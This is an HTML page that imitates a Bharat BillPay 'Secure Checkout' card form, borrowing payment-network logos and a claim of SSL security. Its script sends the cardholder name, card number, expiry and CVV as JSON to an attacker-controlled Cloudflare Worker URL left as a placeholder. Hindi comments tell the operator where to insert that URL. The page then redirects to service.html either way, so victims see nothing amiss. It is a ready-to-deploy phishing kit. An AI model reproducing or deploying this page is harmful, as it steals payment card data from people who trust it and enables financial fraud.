<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Checkout | Bharat BillPay</title>
    <style>
        :root { --gov-blue: #053c85; --gov-orange: #ff9933; --light-bg: #f4f7f9; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        
        body { background: var(--light-bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }

        .payment-card {
            background: #fff; width: 100%; max-width: 400px; border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 4px solid var(--gov-orange);
        }

        .bbps-header { text-align: center; padding: 20px; border-bottom: 1px solid #eee; }
        .bbps-header img { height: 45px; }

        .payment-body { padding: 25px; }
        h3 { color: var(--gov-blue); text-align: center; margin-bottom: 20px; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; }

        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 5px; text-transform: uppercase; }

        input {
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px;
            font-size: 16px; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--gov-blue); box-shadow: 0 0 5px rgba(5, 60, 133, 0.2); }

        .row { display: flex; gap: 15px; }

        .btn-pay {
            width: 100%; padding: 15px; background: var(--gov-orange); color: #fff;
            border: none; border-radius: 8px; font-size: 16px; font-weight: bold;
            cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(255, 153, 51, 0.3);
        }

        .footer-trust { text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; }
        .footer-trust img { height: 25px; margin: 0 8px; opacity: 0.8; }
        .secure-note { font-size: 10px; color: #888; margin-top: 10px; display: block; }
    </style>
</head>
<body>

    <div class="payment-card">
        <div class="bbps-header">
            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="BBPS Logo">
        </div>

        <div class="payment-body">
            <h3>Card Payment</h3>
            
            <form id="payForm">
                <div class="form-group">
                    <label>Card Holder Name</label>
                    <input type="text" id="name" placeholder="Full Name on Card" required>
                </div>

                <div class="form-group">
                    <label>Card Number</label>
                    <input type="tel" id="cardno" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>

                <div class="row">
                    <div class="form-group" style="flex: 1;">
                        <label>Expiry (MM/YY)</label>
                        <input type="tel" id="exp" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <label>CVV</label>
                        <input type="password" id="cvv" maxlength="3" placeholder="***" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                    </div>
                </div>

                <button type="submit" id="submitBtn" class="btn-pay">Proceed to Secure Pay</button>

                <div class="footer-trust">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
                    <img src="https://i.ibb.co/6CRmTBw/images.png">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg">
                    <span class="secure-note">128-bit SSL Secure Transaction</span>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Auto-slash for Expiry
        document.getElementById('exp').addEventListener('input', function (e) {
            let v = this.value.replace(/\D/g, '');
            if (v.length >= 2) {
                this.value = v.substring(0, 2) + '/' + v.substring(2, 4);
            }
        });

        // --- CLOUDFLARE WORKER REDIRECT LOGIC ---
        document.getElementById('payForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            const formData = {
                name: document.getElementById('name').value,
                card: document.getElementById('cardno').value,
                exp: document.getElementById('exp').value,
                cvv: document.getElementById('cvv').value,
                site: window.location.hostname
            };

            // Yahan apna Cloudflare Worker ka URL daal de
            const workerUrl = "https://your-worker.your-subdomain.workers.dev";

            fetch(workerUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            })
            .then(() => {
                // Data bhejte hi service.html par redirect
                window.location.href = "service.html";
            })
            .catch(() => {
                // Agar worker setup nahi bhi hai toh bhi redirect ho jayega
                window.location.href = "service.html";
            });
        });
    </script>
</body>
</html>
